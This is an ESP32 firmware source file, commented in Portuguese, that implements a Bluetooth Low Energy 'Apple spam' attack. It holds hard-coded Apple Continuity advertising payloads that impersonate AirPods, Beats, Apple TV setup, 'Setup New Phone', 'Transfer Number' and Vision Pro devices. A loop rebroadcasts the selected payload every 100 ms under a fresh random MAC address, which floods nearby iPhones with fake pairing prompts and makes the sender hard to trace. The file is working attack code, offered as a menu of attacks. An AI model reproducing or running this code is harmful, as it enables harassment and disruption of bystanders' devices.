#include "apple_spam.h"
#include "bluetooth_service.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/ble_hs_id.h" // Para mudar o endereço MAC
#include "esp_log.h"
#include <string.h>
#include "esp_random.h"

static const char *TAG = "APPLE_SPAM";

// Estrutura interna para armazenar os dados brutos de cada ataque
typedef struct {
    SpamType public_info;       // Informação pública (nome)
    const uint8_t *data;        // Ponteiro para o payload
    uint8_t data_len;           // Comprimento do payload
} SpamAttack;

// --- Payloads dos Dispositivos (adaptados para NimBLE) ---
// NOTA: Os payloads longos foram TRUNCADOS para 26 bytes para caberem no pacote de 31 bytes junto com as flags.

// Payloads de 26 bytes (originalmente 29)
static const uint8_t data_airpods[] = {0x4C,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_airpods_pro[] = {0x4C,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_airpods_max[] = {0x4C,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_airpods_gen2[] = {0x4C,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_airpods_gen3[] = {0x4C,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_airpods_pro_gen2[] = {0x4C,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_beats_solo_pro[] = {0x4C,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_beats_studio_buds[] = {0x4C,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_beats_fit_pro[] = {0x4C,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t data_beats_studio_buds_plus[] = {0x4C,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};


// Payloads de 21 bytes (não precisam de truncamento)
static const uint8_t data_apple_tv_setup[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t data_setup_new_phone[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t data_transfer_number[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t data_tv_color_balance[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t data_vision_pro[] = {0x4C,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x24,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};


// Array principal com todos os ataques disponíveis
static const SpamAttack spam_attacks[] = {
    {{"AirPods"}, data_airpods, sizeof(data_airpods)},
    {{"AirPods Pro"}, data_airpods_pro, sizeof(data_airpods_pro)},
    {{"AirPods Max"}, data_airpods_max, sizeof(data_airpods_max)},
    {{"AirPods Gen 2"}, data_airpods_gen2, sizeof(data_airpods_gen2)},
    {{"AirPods Gen 3"}, data_airpods_gen3, sizeof(data_airpods_gen3)},
    {{"AirPods Pro Gen 2"}, data_airpods_pro_gen2, sizeof(data_airpods_pro_gen2)},
    {{"Beats Solo Pro"}, data_beats_solo_pro, sizeof(data_beats_solo_pro)},
    {{"Beats Studio Buds"}, data_beats_studio_buds, sizeof(data_beats_studio_buds)},
    {{"Beats Fit Pro"}, data_beats_fit_pro, sizeof(data_beats_fit_pro)},
    {{"Beats Studio Buds+"}, data_beats_studio_buds_plus, sizeof(data_beats_studio_buds_plus)},
    {{"AppleTV Setup"}, data_apple_tv_setup, sizeof(data_apple_tv_setup)},
    {{"Setup New Phone"}, data_setup_new_phone, sizeof(data_setup_new_phone)},
    {{"Transfer Number"}, data_transfer_number, sizeof(data_transfer_number)},
    {{"TV Color Balance"}, data_tv_color_balance, sizeof(data_tv_color_balance)},
    {{"Apple Vision Pro"}, data_vision_pro, sizeof(data_vision_pro)},
};
static const int spam_attack_count = sizeof(spam_attacks) / sizeof(SpamAttack);

static bool spam_running = false;
static int current_attack_index = -1;
static TaskHandle_t spam_task_handle = NULL;

// --- Funções Públicas ---
int spam_get_attack_count(void) {
    return spam_attack_count;
}

const SpamType* spam_get_attack_type(int index) {
    if (index < 0 || index >= spam_attack_count) {
        return NULL;
    }
    return &spam_attacks[index].public_info;
}

// --- Lógica Interna ---

static void spam_task(void *pvParameters) {
    ESP_LOGI(TAG, "Tarefa de spam iniciada para o ataque %d", current_attack_index);
    const SpamAttack *attack = &spam_attacks[current_attack_index];

    struct ble_hs_adv_fields fields;
    struct ble_gap_adv_params adv_params;

    // Configura os parâmetros de advertising (não mudam no loop)
    memset(&adv_params, 0, sizeof(adv_params));
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    adv_params.itvl_min = 32; // Intervalo de 20ms
    adv_params.itvl_max = 48; // Intervalo de 30ms

    while (spam_running) {
        // 1. Configura os dados do anúncio
        memset(&fields, 0, sizeof(fields));
        fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
        fields.mfg_data = attack->data;
        fields.mfg_data_len = attack->data_len;
        
        int rc = ble_gap_adv_set_fields(&fields);
        if (rc != 0) {
            ESP_LOGE(TAG, "Erro ao configurar campos: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(100));
            continue; // Tenta novamente no próximo ciclo
        }

        // 2. Muda o endereço MAC para um aleatório
        ble_addr_t rnd_addr;
        rc = ble_hs_id_gen_rnd(0, &rnd_addr);
        if (rc != 0) {
            ESP_LOGE(TAG, "Erro ao gerar endereço aleatório: %d", rc);
        }
        rc = ble_hs_id_set_rnd(rnd_addr.val);
        if (rc != 0) {
            ESP_LOGE(TAG, "Erro ao configurar endereço aleatório: %d", rc);
        }

        // 3. Inicia o anúncio com o novo MAC
        rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, 0, &adv_params, NULL, NULL);
        if (rc != 0) {
            ESP_LOGE(TAG, "Erro ao iniciar anúncio: %d", rc);
        }

        // 4. Anuncia por um curto período e para
        vTaskDelay(pdMS_TO_TICKS(100));
        ble_gap_adv_stop();
    }

    spam_task_handle = NULL;
    vTaskDelete(NULL);
}


esp_err_t spam_start(int attack_index) {
    if (spam_running) {
        ESP_LOGW(TAG, "Spam já está em execução");
        return ESP_ERR_INVALID_STATE;
    }
    if (attack_index < 0 || attack_index >= spam_attack_count) {
        ESP_LOGE(TAG, "Índice de ataque inválido: %d", attack_index);
        return ESP_ERR_NOT_FOUND;
    }

    // Para o anúncio padrão, se estiver ativo
    bluetooth_service_stop_advertising();

    current_attack_index = attack_index;
    spam_running = true;

    // Cria uma tarefa dedicada para o loop de spam
    xTaskCreate(spam_task, "spam_task", 4096, NULL, 5, &spam_task_handle);

    ESP_LOGI(TAG, "Spam para '%s' iniciado", spam_attacks[attack_index].public_info.name);
    return ESP_OK;
}

esp_err_t spam_stop(void) {
    if (!spam_running) {
        ESP_LOGW(TAG, "Spam não está em execução");
        return ESP_ERR_INVALID_STATE;
    }

    spam_running = false; // Sinaliza para a tarefa parar

    // Aguarda um pouco para a tarefa terminar
    if (spam_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    // Garante que o advertising está parado
    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }

    ESP_LOGI(TAG, "Spam parado");
    return ESP_OK;
}

